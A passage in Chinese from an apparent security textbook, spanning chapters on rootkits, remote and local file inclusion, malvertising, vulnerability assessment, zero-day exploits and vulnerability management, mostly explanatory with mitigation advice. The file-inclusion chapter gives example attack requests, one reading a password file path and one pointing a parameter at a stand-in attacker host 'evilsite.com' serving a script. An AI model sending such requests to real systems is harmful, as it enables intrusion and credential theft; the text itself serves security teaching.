
这是一种恶意软件程序，允许隐蔽地获取对 PC 的特权访问。它会危及个人信息并影响计算机性能。一旦安装，Rootkit 会在操作系统启动时或稍后启动。某些类型的 Rootkit 甚至在操作系统启动前运行。Rootkit 可能导致以下后果：

- **隐藏恶意软件**：攻击者可在已感染的计算机上安装其他类型的恶意软件。这些恶意程序对杀毒软件和用户不可见。
- **信息窃取**：攻击者可利用 Rootkit 窃取信用卡信息、登录凭证和其他敏感信息。
- **文件删除**：Rootkit 可擦除系统中的文件和操作系统代码。
- **窃听**：黑客可利用 Rootkit 窃听并拦截个人信息。
- **文件执行**：攻击者可在目标计算机上远程执行文件。
- **远程访问**：Rootkit 可能更改系统配置设置，如修改启动脚本。

## Rootkit 注入

Rootkit 可通过多种方式安装在系统上。

### 搭便车

有时，Rootkit 嵌入在可信软件中，用户在不知情的情况下安装了它们。当软件被授予管理员权限在系统上安装时，Rootkit 也会隐蔽地安装。

### 混合威胁

Rootkit 本身没有感染计算机的能力。攻击者可能会创建混合威胁，利用各种漏洞来攻破系统。在许多情况下，这是通过将 Rootkit 与 `Loader` 和 `Dropper` 合并来实现的。

**Dropper（投放器）**：这是黑客用于在受害者计算机上安装 Rootkit 的文件或程序。分发 Dropper 的方法有多种，包括通过暴力攻击或社会工程学攻击。

**Loader（加载器）**：一旦用户启动了 Dropper 程序（通过执行或打开文件），一段恶意代码（即 Loader）就会启动。

Rootkit 有多种类型，包括：

*   **Application or user-mode rootkit（应用层或用户模式 Rootkit）**：这些在应用层运行。它们可以更改 API 和应用程序行为。应用层 Rootkit 容易被检测到，因为杀毒程序在同一层运行。
*   **Kernel-mode（内核模式）**：它们部署在操作系统的内核模块中。在这里，它们可以控制各种系统进程。很难检测它们。
*   **Bootkits（引导套件）**：这些通过感染 MBR（主引导记录）来接管目标系统。它们使恶意软件能在操作系统加载前运行。
*   **Firmware rootkits（固件 Rootkit）**：它们渗透运行设备的系统，如系统 BIOS、硬盘、网卡和路由器。
*   **Rootkit hypervisors（Rootkit 虚拟机监控程序）**：它们通过利用硬件虚拟化功能来接管机器。

## 反 Rootkit 措施

为了保护系统免受 Rootkit 侵害，你需要扫描任何现有的恶意软件，并防止任何新程序被安装。

**Rootkit scanners（Rootkit 扫描器）**：这些是解析系统以移除活动 Rootkit 的程序。这些扫描器可能对某些 Rootkit 帮助不大，你应该结合使用多个扫描器。

**Preemptive blocking（预防性拦截）**：这涉及培训组织中的用户，避免打开或下载来自可疑来源的文件。

### 第 28 章

### 远程文件包含 (RFI)

RFI（远程文件包含）是一种攻击，它针对动态引用外部脚本的 Web 应用程序中的漏洞。攻击者的目标是利用应用程序的引用功能，从不同域的远程 URL 上传恶意软件。成功的 RFI 攻击可能导致网站被接管、服务器被攻破或信息被盗。

LFI（本地文件包含）类似于 RFI。它是通过 Web 浏览器将受感染文件上传到服务器。大多数情况下，这两者会被一起提及。两者都允许将恶意软件上传到目标服务器。唯一的区别是，LFI 攻击利用本地文件上传中的不安全函数。这允许进行恶意攻击。攻击者随后能够直接将恶意软件上传到受攻破的系统，而不是通过受攻破的外部引用函数从远程位置访问它（如 RFI 中那样）。

## 远程文件包含示例

为了理解 RFI 渗透是如何执行的，请考虑以下示例：

包含以下代码行的 JSP：

```
<jsp:include page="<%=(String)request.getParmeter("ParamName")%>">
```

可通过以下请求进行操纵：

`Page1.jsp?ParamName=/WEB-INF/DB/password`

处理此请求时，攻击者可以看到密码内容文件。

具有请求 URL 内容的导入语句的 Web 应用程序：

```
<c:import url="<%=request.getParameter("conf")%>">
```

如果此语句未经过清理，可用于注入恶意软件。

例如：`Page2.jsp?conf=https://evilsite.com/attack.js`。操纵请求参数使其引用远程文件，也是发起 RFI 攻击的一种方法。

## RFI 的 DIY 预防与缓解

使用适当的清理和输入验证，可以降低 RFI 攻击的风险。然而，当你选择这样做时，必须记住无法完全清理所有用户输入。因此，你应该将清理作为更好安全解决方案的补充。话虽如此，始终建议尽可能彻底地清理受控/用户提供的输入。输入包括：

*   HTTP 头值
*   Cookie 值
*   URL 参数
*   GET/POST 参数

在清理过程中，根据白名单（允许的字符集）检查输入字段，而不是黑名单（不允许的恶意字符）。基本上，黑名单验证不是一个强有力的解决方案。攻击者可以决定以其他格式（如十六进制或编码格式）提供输入。

另一个好的做法是在服务器端应用输出验证机制。客户端的验证功能也无法免疫代理工具攻击，因为它们具有减轻处理开销的优势。

最后，限制上传目录的执行权限。此外，考虑建立允许的文件类型白名单，例如 `JPG`、`DOC`、`PDF` 等，并限制上传文件的大小。适当的文件管理和输入清理实践单独使用是不够的。大多数攻击仍然会发生，因为 DIY 实践助长了一种虚假的安全感。寻找其他高效解决方案，如 `Imperva WAF`（Web 应用防火墙）。

### 第 29 章

### 恶意广告

这是指攻击者将恶意代码插入在线广告网络中。该代码随后将用户重定向到欺诈网站。这种攻击让黑客有机会针对知名网站的用户，如 `The London Stock Exchange`、`The Atlantic`、`The New York Times Online` 和 `Spotify`。

在线广告的生态系统是一个非常复杂的网络。它涉及内容分发网络（`CDNs`）、重定向网络、广告服务器、广告交易平台和发布商网站。当互联网用户点击某个广告时，会在各种服务器之间发生多次重定向。攻击者利用这种复杂性，将恶意软件放置在广告网络和发布商不会怀疑的地方。

人们经常将 Malvertising 与 Adware 或广告恶意软件混淆。

**Adware（广告软件）** 是运行在用户计算机上的程序。在大多数情况下，它嵌入在合法软件中，用户在不知情的情况下安装它。它挖掘用户数据以定向广告，弹出不需要的广告，并将用户的搜索请求重定向到其他广告网站。

**Ad malware（广告恶意软件）** 和 **Malvertising（恶意广告）** 在几个方面有所不同：

*   Adware 针对个别用户，而 Malvertising 中的恶意代码部署在广告商的网页上。
*   只有访问受感染网页的人会受到 Malvertising 的影响，而 Adware 会继续在受感染的计算机上运行。

## 恶意广告对 Web 用户的影响

### 恶意广告

当用户查看恶意广告时，即使不必点击它，也可能发生以下情况：

- **“路过式”下载**— 广告软件或恶意软件被安装在用户的计算机上。浏览器漏洞使此类攻击成为可能。
- 浏览器被强制重定向到恶意网站。
- 可能会显示恶意内容、不需要的广告或弹出窗口。

当用户点击恶意广告时，可能发生以下情况：

- 他们可能会执行一段代码，将广告软件或恶意软件安装到他们的计算机中。
- 用户可能会被重定向到恶意网站，而不是广告建议的网站。
- 用户可能会被重定向到恶意网站，攻击者在该网站上实施网络钓鱼攻击。

## 恶意广告对发布商的影响

发布商将遭受收入和流量损失，声誉也会受损。他们还可能因用户遭受的损害而承担法律责任。发布商很难屏蔽甚至测试恶意广告。

## 恶意软件如何注入广告

- 广告调用中的恶意软件
- 点击后注入的恶意软件
- 广告创意中的恶意软件
- 像素中的恶意软件
- 视频中的恶意软件
- Flash 视频中的恶意软件
- 登录页面上的恶意软件

## 恶意广告的缓解与预防

缓解或预防恶意广告并非易事，因此发布商和最终用户都必须采取行动。

### 面向最终用户

- 安装防病毒软件，以保护您的电脑免受恶意代码和“路过式”下载的侵害。
- 善用广告拦截器。
- 避免使用 Java 和 Flash。
- 更新插件和浏览器。

### 面向发布商

- 仔细审查广告网络，并详细询问广告投放的承诺/保证。
- 扫描展示类广告。
- 也许只在广告框架中展示特定类型的文件。

### 第 30 章：漏洞评估

这是系统地审查信息系统中安全弱点的过程。对系统进行评估，以查看是否存在任何漏洞以及漏洞的严重程度。如有需要，则推荐缓解或修复措施。漏洞评估有助于防止多种威胁，包括：

- **不安全的默认设置**：这是指带有不安全设置的软件，例如，可猜测的管理员密码。
- **XSS**、**SQL 注入** 及类似攻击
- **权限提升**

漏洞评估有不同类型，例如：

- **主机评估**：这是对关键服务器进行评估。如果未经过充分测试，它们就会变得容易受到攻击。
- **网络和无线评估**：评估实践和策略，以阻止对公共或私有网络以及通过网络可访问的资源的未授权访问。
- **数据库评估**：评估大数据系统和数据库的错误配置和漏洞，旨在识别不安全的开发/测试环境或非法数据库，并对组织中的敏感信息进行分类。
- **应用扫描**：识别 Web 应用程序中的安全漏洞，并使用自动化扫描来获取其前端的源代码。

## 漏洞评估：安全扫描的过程

此过程涉及四个步骤。

### 漏洞识别（测试）

此步骤的目的是列出应用程序漏洞的综合清单。分析师检查应用程序和任何其他系统的安全运行状况。他们要么使用自动化工具进行扫描，要么手动进行。这些分析师还依赖威胁情报源、资产管理系统、供应商漏洞公告和漏洞数据库来发现安全弱点。

### 漏洞分析

此步骤旨在找出上一步中发现的漏洞的根本原因和来源。识别导致漏洞的系统组件。例如，漏洞可能是由开源库的旧版本导致的。有了这一发现，就很容易修补漏洞。

### 风险评估

此步骤的目的是确定漏洞的优先级。安全分析师为每个弱点分配严重性评分或等级。他们考虑的因素如下：

- 漏洞可能导致的潜在损害
- 攻击的严重程度
- 妥协或攻击的难易程度
- 面临风险的业务功能
- 面临风险的数据
- 受影响的系统

### 修复

在此步骤中，所有安全缺口都将被关闭。这是开发和运维团队以及安全人员的共同努力。他们确定针对每个漏洞的最佳缓解或修复方法。

修复的具体步骤包括：

- 引入新的安全工具、措施和程序。
- 更新配置或操作变更。
- 开发并实施漏洞补丁。

> **注意**：漏洞评估不是一次性活动。

## 漏洞评估工具

这些工具旨在扫描针对您应用程序的现有和新威胁。它们包括：

- **Web 应用程序扫描器**：它们扫描并模拟攻击模式。
- **协议扫描器**：它们查找易受攻击的网络服务、端口和协议。
- **网络扫描器**：它们识别警告信号，例如可疑数据包生成、欺骗数据包和游离 IP 地址。

### 第 31 章：零日漏洞利用

这是一种网络攻击，针对软件的漏洞——该漏洞对于防病毒供应商或软件供应商而言是未知的。攻击者在其他人之前扫描软件以寻找漏洞，制定攻击计划，然后利用它渗透软件。这些攻击通常具有很高的成功几率，因为没有防御措施。因此，零日攻击应被严肃对待。常见目标包括特定文件类型（Flash、PDF、Excel 或 Word）、Web 浏览器和电子邮件附件。

## 典型目标

- **物联网 (IoT)**、固件和硬件设备
- 拥有易受攻击系统的家庭用户
- 拥有敏感业务信息访问权限的人员
- 大型企业
- 政府部门

## 零日攻击示例

### Stuxnet

Stuxnet 是一种针对制造过程中使用的 PC 的蠕虫病毒。受影响最严重的国家包括印度尼西亚、印度和伊朗。伊朗的铀浓缩工厂是主要目标，意图是破坏该国的核计划。

### Sony 零日攻击

2014 年，索尼影业遭遇了一次零日攻击。此次攻击瘫痪了其网络，并导致敏感企业信息泄露，包括高管的个人电子邮件地址、商业计划和即将上映的电影。被利用的漏洞的确切细节仍不清楚。

### RSA 安全事件

2011 年，安全公司 RSA 的网络被黑客入侵。攻击者利用了 Adobe Flash Player 中的一个未修补漏洞。RSA 员工收到了来自攻击者的电子邮件，邮件附件为嵌入了 Flash 文件的 Excel 电子表格。当员工打开附件时，Poison Ivy（毒藤）恶意软件被安装在其系统上。

### Operation Aurora（极光行动）

此次攻击发生于 2009 年，针对大型公司的知识产权。目标公司包括陶氏化学、雅虎、Adobe Systems 和 Google。漏洞存在于 Perforce 和 Internet Explorer 中。

零日漏洞利用针对的是尚无杀毒软件特征库或补丁的漏洞，因此难以检测。然而，您可以通过以下几种方式检测先前未知的软件漏洞：

## 漏洞扫描

通过漏洞扫描可以检测出多种零日漏洞利用。提供漏洞扫描服务的公司通过模拟攻击来识别任何新漏洞。这种方法并不适用于所有零日漏洞利用。

## 补丁管理

这涉及在发现软件漏洞后立即进行修补。这不一定能防止零日攻击，但可以降低攻击发生的几率。问题在于，发现漏洞并开发、分发杀毒软件需要时间。如果这个过程耗时过长，攻击就可能发生。

## 输入验证与清理

这种方法非常有效（可能是最好的）。它涉及在网络边缘部署 WAF（Web 应用防火墙）。该 WAF 将审查所有传入的流量，并过滤掉可能存在的恶意输出。

## 零日计划

这是一个奖励负责任地披露漏洞的安全研究人员的计划，而不是将这些信息出售给不法分子。

### 第 32 章

### 漏洞管理

## 什么是漏洞管理？

**Vulnerability（漏洞）**：应用程序中可被利用的弱点。漏洞被用于执行攻击，可能导致服务器被接管、恶意软件注入、数据窃取等后果。

**Vulnerability management（漏洞管理）**涉及在不法分子滥用这些弱点之前将其根除。实现这一目标的方法如下：

- **Vulnerability scanning（漏洞扫描）**：使用代码审查和渗透测试对代码环境进行清理。通常在应用程序更新后执行。
- **Patch management（补丁管理）**：将新漏洞的补丁部署到您的应用程序所使用的第三方软件中。
- **Input validation/sanitization（输入验证/清理）**：使用 WAF 验证和过滤传入流量。因此，攻击在利用漏洞之前就被阻断了。这是清理应用程序代码的一个很好的替代方案。

在漏洞扫描中，使用基于硬件的扫描器或软件来识别攻击者可利用的代码中的薄弱环节。薄弱环节通常由未清理的代码引起。扫描通过代码审查和渗透测试来揭示应用程序中的弱点，然后进行代码更新以消除这些漏洞。随后进行一次重新扫描，以确保漏洞已不复存在。每当代码更新或发现新的攻击向量时，都应执行此过程。

一般来说，漏洞扫描存在若干操作问题。首先，新漏洞层出不穷。因此，扫描是一个频繁的过程，需要大量资源。即便如此，由于代码库处于持续变化状态，很难实现完全的代码清理。此外，您无法预测所有攻击场景。最后，漏洞扫描无法为新发现的威胁提供快速解决方案。这非常关键，因为许多漏洞利用会在新漏洞公布后立即执行。响应这些威胁所需的时间在任何漏洞管理策略中都至关重要。

第三方必须编制补丁并对其进行测试。然后您的 DevOps 和安全团队负责将这些补丁部署到您的系统中。补丁延迟经常发生，通常是因为：

- 您的安全团队部署补丁并检查其实施所需的时间。
- 您的软件供应商设计和测试新补丁的能力。
- 您的团队接收威胁通知所需的时间。

**Input Validation/Sanitization（输入验证/清理）**是在网络边缘放置 WAF 的过程。它审查传入流量并过滤掉任何恶意输入。输入验证有效地解决了补丁管理和漏洞扫描的问题，原因如下：

- **它不需要代码更新**：修补和扫描过程不是很有效，因为它们依赖于容易延迟的代码更新。
- **由安全专家处理**：一些 WAF 提供商将解决方案作为托管服务提供。
- **它具有可自定义的安全规则**。
- **Virtual patch management（虚拟补丁管理）**：这允许有效缓解即时威胁。

### 第 33 章

### Web 应用安全
